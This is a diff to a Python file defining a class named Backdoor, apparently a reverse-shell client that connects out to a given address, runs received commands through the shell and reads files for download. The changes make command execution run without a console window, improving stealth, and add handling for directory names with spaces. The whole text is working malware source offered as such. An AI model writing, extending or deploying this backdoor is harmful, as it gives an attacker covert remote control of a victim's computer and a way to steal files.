@@ -5,6 +5,7 @@ import subprocess
 import json
 import os
 import base64 as b64
+import sys
 
 class Backdoor:
     def __init__(self,ip, port):
@@ -45,23 +46,33 @@ class Backdoor:
         #     return subprocess.check_output(command, shell=True)
         # except subprocess.CalledProcessError:
         #     return "error during command execution"
-        return subprocess.check_output(command, shell=True)
+        return subprocess.check_output(command, shell=True, 
+                                stderr= subprocess.DEVNULL, #to run without console
+                                stdin= subprocess.DEVNULL) #to run without console
 
     def run(self):
         while True:
             # command = self.connection.recv(2048).decode()
             command = self.receive_json()
-
+            
             try:
                 #exit program
                 if(command[0].lower() == "exit"):
                     self.connection.close()
-                    exit()
+                    sys.exit()
 
                 #change directory
                 elif(command[0] == "cd" and (len(command) > 1) ):
-                    command_result = self.change_directory(command[1])
-
+            
+                    if(len(command) > 2): #in case directory has spaces in it
+                        directory = ""
+                        for i in range(1, len(command) ):
+                            directory = directory + " " + command[i]
+                        print("directory: ", directory)
+                        command_result = self.change_directory(directory)
+                    else:
+                        command_result = self.change_directory(command[1])
+                
                 #download file
                 elif(command[0].lower() == "download"):
                     command_result = self.read_file(command[1]).decode()
